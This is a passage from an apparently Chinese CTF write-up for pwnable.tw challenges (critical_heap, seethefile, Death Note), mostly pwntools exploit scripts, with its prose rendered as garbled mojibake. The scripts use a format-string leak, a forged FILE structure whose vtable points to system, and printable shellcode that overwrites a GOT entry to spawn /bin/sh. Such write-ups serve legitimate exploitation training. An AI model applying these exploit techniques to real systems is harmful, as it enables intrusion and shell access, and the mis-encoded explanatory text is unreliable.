cn.sendline('aaaa')

cn.recvuntil('Your choice : ')
cn.sendline('5')

dele(0)

create_normal_heap('bbbb','B'*8)#0
show(0)

cn.recvuntil('B'*8)
if local:
	heap_base = u32(cn.recv(4))-0x2e5
else:
	heap_base = u32(cn.recv(4))-0x145
success('heap_base: '+hex(heap_base))


create_system_heap('cccc')#1
#play->set name
cn.sendline('4')
cn.recvuntil('Index of heap :')

cn.sendline('1')#idx
cn.recvuntil('Your choice : ')
cn.sendline('1')
cn.recvuntil('Give me a name for the system heap :')
cn.sendline('TZ')
cn.recvuntil('Give me a value for this name :')
cn.sendline('flag')
#play->set name
cn.recvuntil('Your choice : ')
cn.sendline('1')
cn.recvuntil('Give me a name for the system heap :')
cn.sendline('TZDIR')
cn.recvuntil('Give me a value for this name :')
if local:
	cn.sendline('/home/veritas')
else:
	cn.sendline('/home/critical_heap++')
cn.recvuntil('Your choice : ')
cn.sendline('5')

create_clock_heap('dddd')#2

if local:
	flag_addr=heap_base + 0x8b0
else:
	flag_addr=heap_base + 0x5e0

#play->change content
cn.sendline('4')
cn.recvuntil('Index of heap :')

cn.sendline('0')#idx
cn.recvuntil('Your choice : ')
cn.sendline('2')
cn.recvuntil('Content :')
success('flag_addr: '+hex(flag_addr))
cn.sendline('%c%c%c%c%c%c%c%c%c%c%c%c%sAAAAAA'+p64(flag_addr))
#play->show
cn.recvuntil('Your choice : ')
#z('b*0x000000000040194B\nc')
cn.sendline('1')
cn.recvuntil('Content :')
cn.interactive()
```



## seethefile 250pts

æ¯”è¾ƒåŸºç¡€çš„FILEé¢˜

é¦–å…ˆæ˜¯leak,ç”±äºå¯ä»¥è¯»æ–‡ä»¶åä¸å«flagçš„ä¸œè¥¿,é‚£å°±ç›´æ¥è¯»`/proc/self/maps`å°±è¡Œäº†.

ä¸è¿‡ç”±äºreadçš„é•¿åº¦é™åˆ¶,ç¨‹åºåªè¯»äº†ä¸€éƒ¨åˆ†è¿›æ¥,ä¸è¿‡å·²ç»è¶³å¤ŸçŸ¥é“libcçš„åœ°å€äº†.

ç„¶åæ˜¯åœ¨exitçš„æ—¶å€™æœ‰ä¸ªæš´åŠ›çš„æ ˆæº¢å‡ºç»™æˆ‘ä»¬ç”¨.

```cpp
case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", name);             // overflow
        printf("Thank you %s ,see you next time\n", name);
        if ( fp )
          fclose(fp);
        exit(0);
        return;
```

ä½†æ˜¯nameåé¢èƒ½è¦†ç›–çš„,å°±åªæœ‰fpæŒ‡é’ˆè€Œå·²äº†.æŒ‡æ˜äº†è¦ç”¨fileåš.

è¦†ç›–æŒ‡é’ˆåä¸€è·¯ä¸‹å»é¡ºä¾¿ä¼ªé€ ä¸€ä¸ªFILEç»“æ„ä½“åœ¨bssä¸Šå³å¯.

bypassä¸€äº›æ¡ä»¶åfcloseå°±ä¼šè°ƒç”¨ä¼ªé€ çš„vtableä¸Šçš„close,æˆ‘ä»¬æ”¹ä¸ºsystem,ä»è€Œgetshell.

exp:
```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('/home/veritas/seethefile')
	#bin = ELF('./seethefile')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	cn = remote('chall.pwnable.tw', 10200)
	libc = ELF('./libc_32.so.6')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def open(name):
	cn.recvuntil('Your choice :')
	cn.sendline('1')
	cn.recvuntil('see :')
	cn.sendline(name)

def read():
	cn.recvuntil('Your choice :')
	cn.sendline('2')

def write():
	cn.recvuntil('Your choice :')
	cn.sendline('3')

def close():
	cn.recvuntil('Your choice :')
	cn.sendline('4')

def exit(con):
	cn.recvuntil('Your choice :')
	cn.sendline('5')
	cn.recvuntil('Leave your name :')
	cn.sendline(con)

open('/proc/self/maps')
read()
write()

cn.recvline()
cn.recvline()
cn.recvline()
heap = int(cn.recvline()[:8],16)
success('heap: '+hex(heap))
libc.address = int(cn.recvline()[:8],16)+0x1000
success('libc_base: '+hex(libc.address))
system = libc.sym['system']
close()

open('/proc/self/maps')
pay = '\x00'*32 + p32(0x0804B300)
pay+='\x00'*(0x80-4)
#0804B300
file = '\xff\xff\xff\xff;$0\x00'.ljust(0x48,'\x00')
file = file.ljust(0x94,'\x00')
pay+=file
pay+=p32(0x0804B300+0x98)
pay+=p32(system)*21#vtable
#z('dir /home/veritas/glibc/source/glibc-2.23/libio\nb*0x08048AE0\nb fclose\nc')
exit(pay)
cn.interactive()
```



## Death Note 250pts

ä¸»è¦æ˜¯å†™printable shellcode
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
æ´å¾ˆç®€å•.æ¯ä¸ªindexéƒ½æ²¡æœ‰æ£€æŸ¥ä¸‹é™,å› æ­¤å¯ä»¥ä¸ºè´Ÿæ•°,ä»è€Œè¦†ç›–gotå‡½æ•°ä¸ºshellcode.

æ‰“ç®—è¦†ç›–free.

åˆå§‹å¯„å­˜å™¨çŠ¶æ€:
```
'''
*EAX  0x9a99008 â—‚â€” 'jhh///sh/bin'
 EBX  0x0
*ECX  0x0
*EDX  0x0
 EDI  0xf7712000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7712000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” mov    al, 0x1d /* 0x1b1db0 */
 EBP  0xffbaad08 â€”â–¸ 0xffbaad18 â—‚â€” 0x0
*ESP  0xffbaacdc â€”â–¸ 0x8048878 (del_note+81) â—‚â€” add    esp, 0x10
*EIP  0x8048490 (free@plt) â—‚â€” jmp    dword ptr [0x804a014]
'''
```

å…³äºprintable shellcode,ç½‘ä¸Šæ‰¾åˆ°å¦‚ä¸‹èµ„æ–™

```
1.æ•°æ®ä¼ é€:
push/pop eax...
pusha/popa

2.ç®—æœ¯è¿ç®—:
inc/dec eax...
sub al, ç«‹å³æ•°
sub byte ptr [eax... + ç«‹å³æ•°], al dl...
sub byte ptr [eax... + ç«‹å³æ•°], ah dh...
sub dword ptr [eax... + ç«‹å³æ•°], esi edi
sub word ptr [eax... + ç«‹å³æ•°], si di
sub al dl..., byte ptr [eax... + ç«‹å³æ•°]
sub ah dh..., byte ptr [eax... + ç«‹å³æ•°]
sub esi edi, dword ptr [eax... + ç«‹å³æ•°]
sub si di, word ptr [eax... + ç«‹å³æ•°]

3.é€»è¾‘è¿ç®—:
and al, ç«‹å³æ•°
and dword ptr [eax... + ç«‹å³æ•°], esi edi
and word ptr [eax... + ç«‹å³æ•°], si di
and ah dh..., byte ptr [ecx edx... + ç«‹å³æ•°]
and esi edi, dword ptr [eax... + ç«‹å³æ•°]
and si di, word ptr [eax... + ç«‹å³æ•°]

xor al, ç«‹å³æ•°
xor byte ptr [eax... + ç«‹å³æ•°], al dl...
xor byte ptr [eax... + ç«‹å³æ•°], ah dh...
xor dword ptr [eax... + ç«‹å³æ•°], esi edi
xor word ptr [eax... + ç«‹å³æ•°], si di
xor al dl..., byte ptr [eax... + ç«‹å³æ•°]
xor ah dh..., byte ptr [eax... + ç«‹å³æ•°]
xor esi edi, dword ptr [eax... + ç«‹å³æ•°]
xor si di, word ptr [eax... + ç«‹å³æ•°]

4.æ¯”è¾ƒæŒ‡ä»¤:
cmp al, ç«‹å³æ•°
cmp byte ptr [eax... + ç«‹å³æ•°], al dl...
cmp byte ptr [eax... + ç«‹å³æ•°], ah dh...
cmp dword ptr [eax... + ç«‹å³æ•°], esi edi
cmp word ptr [eax... + ç«‹å³æ•°], si di
cmp al dl..., byte ptr [eax... + ç«‹å³æ•°]
cmp ah dh..., byte ptr [eax... + ç«‹å³æ•°]
cmp esi edi, dword ptr [eax... + ç«‹å³æ•°]
cmp si di, word ptr [eax... + ç«‹å³æ•°]

5.è½¬ç§»æŒ‡ä»¤:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.äº¤æ¢al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.æ¸…é›¶:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
```

exp:

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1

if local:
	cn = process('./death_note')
else:
	cn = remote('chall.pwnable.tw', 10201)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


def add(idx,con):
	cn.sendline('1')
	cn.recvuntil('Index :')
	cn.sendline(str(idx))
	cn.recvuntil('Name :')
	cn.sendline(con)

def dele(idx):
	cn.sendline('3')
	cn.recvuntil('Index :')
	cn.sendline(str(idx))

pay = asm('''
/* execve('/bin///sh',0,0)*/

push 0x68
push 0x732f2f2f
push 0x6e69622f

push esp
pop ebx /*set ebx to '/bin///sh'*/


push edx
dec edx
dec edx /*set dl to 0xfe*/


xor [eax+32],dl /*decode int 0x80*/
xor [eax+33],dl /*decode int 0x80*/

inc edx
inc edx /*recover edx to 0*/

push edx
pop ecx /*set ecx to 0*/

push 0x40
pop eax
xor al,0x4b /*set eax to 0xb*/

/*int 0x80*/
''')+'\x33\x7e'

add(-19,pay)
#z('b*0x08048490\nc')
dele(-19)

cn.interactive()

```
